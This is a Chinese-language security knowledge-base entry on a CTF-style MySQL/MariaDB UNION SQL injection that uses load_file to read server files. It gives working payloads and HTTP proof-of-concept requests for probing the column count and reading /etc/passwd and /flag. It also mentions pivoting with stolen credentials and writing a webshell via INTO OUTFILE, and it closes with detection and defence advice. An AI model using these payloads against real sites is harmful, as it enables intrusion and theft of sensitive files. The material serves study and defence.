---
id: web-generic-sqli-mysql-union-load-file-read
title: MySQL/MariaDB UNION 注入 + load_file 任意文件读取：列数探测后把文件内容回显到联合查询列
type: scenario
domain: web
path: web/generic/sqli
technique: mysql-union-load-file-read
tags:
- sqli
- union
- mysql
- mariadb
- load_file
- arbitrary-file-read
- file-read
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V195
  verified_at: '2026-11-06T23:12:08+08:00'
  notes: 已对照原文核对；9 列 UNION、load_file(/etc/passwd) 与 /flag 回显截图一致；未复跑。
url: /docs/web/generic/sqli/web-generic-sqli-mysql-union-load-file-read/
draft: false
kb_aliases:
- UNION 注入读文件
- load_file 任意文件读取
- MySQL load_file
- 列数探测 union select
- search 参数联合注入
- MySQL 读取 /etc/passwd
---

## 一句话结论

当应用把搜索参数直接拼进 SQL 且页面会回显查询结果时，先用单引号触发报错、再用 `UNION SELECT 1,2,...,N` 逐步探测列数，把 `load_file('/etc/passwd')` 放在某个有回显的列位置，就能让数据库读取服务器文件并把内容随查询结果返回；配合 `#` 注释掉原查询剩余部分即可稳定利用。

## 原理

- **UNION 的列数约束**：`UNION` 要求前后两个 SELECT 的列数一致；列数不对时数据库返回 “The used SELECT statements have a different number of columns”。攻击者从 1 列开始递增，直到页面正常回显，即得到原查询的列数（示例为 9 列）。
- **回显位**：联合查询后半段的常量/函数结果会出现在页面原本展示字段的位置；只要 `load_file()` 落在有回显的列（示例为第 9 列），文件内容就会显示在商品名/描述等位置。
- **load_file 的前置条件**：MySQL/MariaDB 的 `load_file(path)` 读取服务器本地文件并返回字符串；需要当前数据库用户具备 `FILE` 权限，且 `secure_file_priv` 为空或包含目标路径（非空时只能读该目录下文件）。路径必须是绝对路径；Windows 下用 `C:/Windows/win.ini` 或 `C:\\Windows\\win.ini`。
- **注释闭合**：原查询通常在注入点后还有 `AND p.stock > 0` 等条件；用 `#`（URL 编码 `%23`）或 `-- ` 注释掉剩余部分，避免语法错误。示例 `search=' union select 1,2,3,4,5,6,7,8,load_file('/etc/passwd')%23` 中，第一个单引号闭合原字符串，`#` 截断后续条件。
- **为什么不用报错注入**：示例中 `updatexml(1,concat(0x7e,database(),0x7e),1)` 返回 “Only constant XPATH queries are supported”，说明目标 MariaDB 对非常量 XPath 做了限制；此时 UNION 回显更直接。
- **读取 flag/配置**：同样的列位可换成 `load_file('/flag')`、应用配置文件、`/etc/shadow`（需权限）等；读到的内容直接出现在页面，无需额外回连。

## 触发条件

- 目标为 MySQL/MariaDB，存在字符串型 SQL 注入且页面会展示查询结果（联合查询有回显位）。
- 数据库用户具备 `FILE` 权限；`secure_file_priv` 未限制目标路径（或目标在允许目录内）。
- 注入点后的原查询可被 `#`/`-- ` 注释闭合，且应用未对 `union`、`select`、`load_file` 做拦截。
- 目标文件对数据库进程可读（Linux 常见 `/etc/passwd`、`/flag`；Windows 为盘符绝对路径）。

## 利用步骤

1. **确认注入**：在搜索参数后加单引号（如 `search=1'`），观察是否出现 SQL 语法错误；示例报错为 MariaDB 的 `You have an error in your SQL syntax ... near 'AND p.stock > 0' at line 4`。
2. **尝试报错注入（可选）**：`search=' and updatexml(1,concat(0x7e,database(),0x7e),1)%23`；若返回 “Only constant XPATH queries are supported” 等限制，改走 UNION。
3. **探测列数**：从 `search=' union select 1%23` 开始，逐步增加列数；示例 `1,2,3,4` 报列数不一致，`1..9` 正常回显，`1..10` 再次报错，确定 9 列。
4. **定位回显位**：把数字换成 `database()`、`user()`、`version()` 等，观察哪个列的内容出现在页面；示例第 9 列可回显。
5. **读取文件**：`search=' union select 1,2,3,4,5,6,7,8,load_file('/etc/passwd')%23`，页面出现 `/etc/passwd` 内容即成功。
6. **读取目标文件**：把路径换成 `/flag`、应用配置、数据库凭据文件等；Windows 用 `load_file('C:/Windows/win.ini')`。
7. **后续**：用读到的数据库口令/密钥横向；若 `FILE` 权限且目录可写，还可评估 `INTO OUTFILE` 写 WebShell，但需确认 `secure_file_priv` 与目录权限。

## PoC

```http
GET /frontend/products.php?search=1%27 HTTP/1.1
Host: target

GET /frontend/products.php?search=%27%20union%20select%201,2,3,4,5,6,7,8,9%23 HTTP/1.1
Host: target

GET /frontend/products.php?search=%27%20union%20select%201,2,3,4,5,6,7,8,load_file(%27/etc/passwd%27)%23 HTTP/1.1
Host: target
```

```text
# 列数探测
search=' union select 1,3,4%23          -> different number of columns
search=' union select 1,2,3,4,5,6,7,8,9%23   -> 正常回显（9 列）
search=' union select 1,2,3,4,5,6,7,8,9,10%23 -> different number of columns

# 文件读取
search=' union select 1,2,3,4,5,6,7,8,load_file('/etc/passwd')%23
search=' union select 1,2,3,4,5,6,7,8,load_file('/flag')%23
```

示例读取结果中，`/etc/passwd` 的 `root:x:0:0:root:/root:/bin/bash` 等行直接出现在商品列表；`/flag` 内容（形如 `dart{...}`）出现在商品名/描述处。

## 变体与关联

- **列数未知**：可用 `ORDER BY N` 二分探测列数，或先用 `UNION SELECT NULL,NULL,...` 规避类型转换问题。
- **回显位被过滤**：把 `load_file()` 包在 `concat(0x7e,load_file(...),0x7e)` 中便于识别；或改用 `hex(load_file(...))` 避免二进制/编码问题。
- **secure_file_priv 限制**：非空时只能读指定目录；可通过 `SELECT @@secure_file_priv` 查询，或改读该目录下文件；无 FILE 权限时 `load_file` 返回 NULL。
- **报错注入替代**：`updatexml`/`extractvalue` 被限制时，可用 `floor(rand(0)*2)`、`exp(~(...))` 等报错原语；联合查询有回显时优先 UNION。
- **写入变体**：`INTO OUTFILE`/`INTO DUMPFILE` 可在目录可写时写文件，但受 `secure_file_priv`、`FILE` 权限和 `--secure-file-priv` 限制，且不能覆盖已有文件。
- 关联：[[web-generic-sqli-error-based-extraction]]（报错注入原语）、[[web-generic-sqli-jsherp-orderby-extractvalue-loadfile]]（ORDER BY/extractvalue 场景下用 load_file 读文件）、[[web-generic-sqli-weaver-e9-filedownloadlocation-union-file-read]]（UNION 控制下载路径读文件的产品案例）、[[web-generic-file-inclusion-java-new-file-root-path-traversal-read]]（应用层任意文件读取的对照）。

## 检测与防御

- **WAF/日志**：监控搜索参数中的单引号、`union`、`select`、`load_file`、`into outfile`、`#`/`--` 注释组合；同一参数短时间出现列数递增的请求序列是典型探测。
- **数据库侧**：最小化应用数据库账号权限，撤销不必要的 `FILE` 权限；设置 `secure_file_priv` 为专用目录或 `NULL`；开启通用日志/审计，关注 `load_file` 调用。
- **应用侧**：所有 SQL 使用参数化查询/预编译，搜索条件用绑定参数；错误信息不要直出数据库原文；对返回字段做类型与长度约束。
- **主机侧**：数据库进程以低权限运行，限制其对敏感文件（`/etc/shadow`、应用配置、flag）的读权限；容器化部署时用只读文件系统与最小挂载。
